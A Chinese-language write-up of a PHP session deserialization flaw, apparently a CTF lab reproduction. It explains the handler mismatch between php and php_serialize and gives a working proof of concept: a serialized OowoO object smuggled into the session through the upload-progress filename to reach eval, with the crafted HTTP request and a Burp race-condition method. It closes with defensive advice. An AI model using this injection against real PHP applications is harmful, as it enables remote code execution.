## 原理

### php session反序列化的定义
什么是php session反序列化，当php开启会话(session_start)的时候，php会从对应session文件中读取数据将其反序列化到$\_SESSION，同样地，当会话关闭时，php会把$\_SESSION里面的数据序列化存入session文件，php内置了多种处理器用于存取$\_SESSION数据，常用的有以下三种不同的处理格式：
| 处理器                    | 对应的存储格式                                               | 示例（序列化串）   | 备注                                                 |
| ------------------------- | ------------------------------------------------------------ | ------------------ | ---------------------------------------------------- |
| php                       | 键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值          | a\|i:2;            |                                                      |
| php_binary                | 键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值 | ^Aai:2;            | ^A为一个字符，<br />通过hexdump -C查看其十六进制为01 |
| php_serialize(php>=5.5.4) | 经过 serialize() 函数反序列处理的数组                        | a:1:{s:1:"a";i:2;} |                                                      |
示例结果为```$_SESSION['a'] = 2```的序列化串，可使用如下代码测试得到，
```php
<?php
ini_set('session.serialize_handler', 'php_serialize');
session_start();
$_SESSION['a'] = 2;
session_write_close();
```
我使用oneinstack安装php之后显示的默认处理器是php不是php_serialize，应该是oneinstack对其进行了修改

### 产生的原理
漏洞产生的原理就是在用session.serialize_handler = php_serialize存储的字符可以引入|, 再用session.serialize_handler = php格式取出session文件内容时，|会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞，具体可参见漏洞复现部分。

### 涉及的php.ini配置项![/data/typora_assets/php session反序列化踩坑/image-20200708210328939.png](https://i.loli.net/2020/07/10/8aEIF5zQwyqmYsU.png)
默认情况下session.upload_progress.cleanup的值为On，我们目前暂时手动修改为Off，以便保证在脚本开始运行时上传进度相关的session信息依然存在，在该选项为On的情况下可以利用竞态条件来实现session信息的反序列化，关于该配置项的解释，可参见php官方文档。
> Note that if you run that code and you print out the content of $_SESSSION[$key] you get an empty array due that session.upload_progress.cleanup is on by default and it  cleans the progress information as soon as all POST data has been read.
Set it to Off or 0 to see the content of $_SESSION[$key].

## 复现
复制该题http://web.jarvisoj.com:32784/index.php的源码存入session_unserialize.php，它在开头使用了```ini_set('session.serialize_handler', 'php');```而php.ini中session.serialize_handler配置为php_serialize，故可能存在php session反序列化漏洞，而恰好有类OowoO存在eval危险函数，此危险函数同时又在类OowoO的__destruct()中，于是我们使用如下代码构造序列化串以显示文件所在目录
```php
<?php
class OowoO
{
    public $mdzz='print_r(dirname(__FILE__));';
}
$obj = new OowoO();
$a = serialize($obj);

var_dump($a);

输出结果：
'O:5:"OowoO":1:{s:4:"mdzz";s:27:"print_r(dirname(__FILE__));";}'
```
在输出结果前面加上|，然后想办法作为$\_SESSION的某个键值使用php_serialize处理器序列化到session文件中，然后再从session文件中使用php处理器反序列化出来，那么漏洞就会产生。
反序列化的漏洞文件session_unserialize.php已经有了，下一步重点是我们要想办法把序列化串存到$\_SESSION中，这时就要用到php.ini的配置项sesssion.upload_progress.enabled=On，默认为开启状态，查看php官方文档https://www.php.net/manual/en/session.upload-progress.php

> The upload progress will be available in the $_SESSION superglobal when an upload is in progress, and when POSTing a variable of the same name as the session.upload_progress.name INI setting is set to. When PHP detects such POST requests, it will populate an array in the $_SESSION, where the index is a concatenated value of the session.upload_progress.prefix and session.upload_progress.name INI options. The key is typically retrieved by reading these INI settings, i.e.

也就是说当开启上传进度查看时，如果发送一个POST请求，POST请求中有个参数的名称是session.upload_progress.name的值（一般是PHP_SESSION_UPLOAD_PROGRESS），那么后端会在$\_SESSION超全局数组里面记录上传进度用以返回给前端，具体$_SESSION超全局数组里面会存储什么，下面也有介绍，也可以自行写代码测试进行查看，
```php+HTML
Example of the structure of the progress upload array.

<form action="upload.php" method="POST" enctype="multipart/form-data">
 <input type="hidden" name="<?php echo ini_get("session.upload_progress.name"); ?>" value="123" />
 <input type="file" name="file1" />
 <input type="file" name="file2" />
 <input type="submit" />
</form>

The data stored in the session will look like this:

<?php
$_SESSION["upload_progress_123"] = array(
 "start_time" => 1234567890,   // The request time
 "content_length" => 57343257, // POST content length
 "bytes_processed" => 453489,  // Amount of bytes received and processed
 "done" => false,              // true when the POST handler has finished, successfully or not
 "files" => array(
  0 => array(
   "field_name" => "file1",       // Name of the <input/> field
   // The following 3 elements equals those in $_FILES
   "name" => "foo.avi",
   "tmp_name" => "/tmp/phpxxxxxx",
   "error" => 0,
   "done" => true,                // True when the POST handler has finished handling this file
   "start_time" => 1234567890,    // When this file has started to be processed
   "bytes_processed" => 57343250, // Number of bytes received and processed for this file
  ),
  // An other file, not finished uploading, in the same request
  1 => array(
   "field_name" => "file2",
   "name" => "bar.avi",
   "tmp_name" => NULL,
   "error" => 0,
   "done" => false,
   "start_time" => 1234567899,
   "bytes_processed" => 54554,
  ),
 )
);
```
值得一提的是这种情况下，$\_SESSION超全局数组里面会存储$\_FILES超全局数组里面的一些信息，最为关键的是file name和file temp name，我们就借助file name来把序列化串写入到$\_SESSION中，构造html请求表单
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>php session unserialize example</title>
</head>
<body>
<form action="http://localhost/vuln/session_unserialize.php" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
    <input type="file" name="file" />
    <input type="submit" />
</form>
</body>
</html>
```
随意提交文件上传，burp拦截改包如下，
```http
POST /vuln/session_unserialize.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------1314365402189625052536245878
Content-Length: 424
Referer: http://localhost/vuln/session_unserialize.html
Cookie: PHPSESSID=9nhpcsuogisgjnmfm5e3gqri43; XDEBUG_SESSION=PHPSTORM
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

-----------------------------1314365402189625052536245878
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

123
-----------------------------1314365402189625052536245878
Content-Disposition: form-data; name="file"; filename="|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:27:\"print_r(dirname(__FILE__));\";}"
Content-Type: application/octet-stream


-----------------------------1314365402189625052536245878--

```
因为HTTP包Cookie中带有XDEBUG_SESSION=PHPSTORM，故burp发包也会触发PHPSTORM调试机制，该包我们调试一下，
![/data/typora_assets/php session反序列化踩坑/image-20200708220406122.png](https://i.loli.net/2020/07/10/YEn89uHV1lLcOfx.png)

此时session文件内容如下
```shell
# xiaopo @ fht in ~/grayguest.github.io on git:writing x [22:02:34] 
$ sudo cat /tmp/sess_9nhpcsuogisgjnmfm5e3gqri43
a:2:{s:1:"a";i:2;s:19:"upload_progress_123";a:5:{s:10:"start_time";i:1594216960;s:14:"content_length";i:424;s:15:"bytes_processed";i:424;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:4:"file";s:4:"name";s:63:"|O:5:"OowoO":1:{s:4:"mdzz";s:27:"print_r(dirname(__FILE__));";}";s:8:"tmp_name";s:14:"/tmp/php5ueiZ3";s:5:"error";i:0;s:4:"done";b:1;s:10:"start_time";i:1594216960;s:15:"bytes_processed";i:424;}}}}%   
```
此时还未更改反序列化处理器，所以$_SESSION数组比较正常，有的人可能会问，session_start()还没开始，怎么数据已经反序列化到$\_SESSION数组中了呢，这可能是因为session.auto_start = on，具体session.auto_start的解释可参见https://github.com/80vul/phpcodz/blob/master/research/pch-013.md，
>配置选项 session.auto_start＝On，会自动注册 Session 会话，因为该过程是发生在脚本代码执行前，所以在脚本中设定的包括序列化处理器在内的 session 相关配选项的设置是不起作用的，因此一些需要在脚本中设置序列化处理器配置的程序会在 session.auto_start＝On 时，销毁自动生成的 Session 会话，然后设置需要的序列化处理器，再调用 session_start() 函数注册会话

但是我的php.ini中session.auto_start配置为off，那又会是其他什么原因呢，猜测可能和上传过程有关系，先不管它，往下单步，

![/data/typora_assets/php session反序列化踩坑/image-20200708220516329.png]https://i.loli.net/2020/07/10/uqMmdC5hAKX9ELw.png)
此时已经更改反序列化处理器为php，故会使用php处理器进行反序列化后存入$\_SESSION，于是危险类被触发，返回当前路径，待执行完毕，session文件内容如下，

```shell
# xiaopo @ fht in ~/grayguest.github.io on git:writing x [22:02:53] 
$ sudo cat /tmp/sess_9nhpcsuogisgjnmfm5e3gqri43
a:1:{s:19:"upload_progress_123";a:5:{s:10:"start_time";i:1594217096;s:14:"content_length";i:424;s:15:"bytes_processed";i:424;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:4:"file";s:4:"name";s:63:"|O:5:"OowoO":1:{s:4:"mdzz";s:27:"print_r(dirname(__FILE__));";}%   
```

## 利用竞态条件来实现session信息的反序列化
panda师傅的这篇文章https://xz.aliyun.com/t/6640#toc-10最后的实例，关于“由于请求后，session会立刻被清空覆盖，因此需要不断发送请求，这里可以写脚本，也可以直接利用burp ，我偷个懒直接利用 burp ：”我理解session之所以会被清空是因为session.upload_progress.cleanup为On，按道理它在php文件运行前就已经被清空了，后来得知panda师傅是利用竞态条件来实现的，然后我尝试burp发包1000次也没能写入文件，刚开始不知道可能是什么原因，
![/data/typora_assets/php session反序列化踩坑/image-20200710104920949.png](https://i.loli.net/2020/07/10/c7MG9LpOYX3kmfz.png)
后来把burp intruder线程调到50，成功反序列化，另外注意web权限要有写本地文件权限。
![/data/typora_assets/php session反序列化踩坑/image-20200710151950385.png](https://i.loli.net/2020/07/10/qi6WfLx28RQv3Ce.png)

## 防御
- 统一使用相同的处理器做序列化/反序列化，比如php_serialize
- 当使用php处理器做反序列化时，必须保证不和php_serialize处理器混用。

## 参考链接
- https://xz.aliyun.com/t/3674
- https://xz.aliyun.com/t/6640
- https://github.com/80vul/phpcodz/blob/master/research/pch-013.md
- https://mp.weixin.qq.com/s/n5ofmXbDxWgOCg4oNgPtsw
- https://www.php.net/manual/en/session.upload-progress.php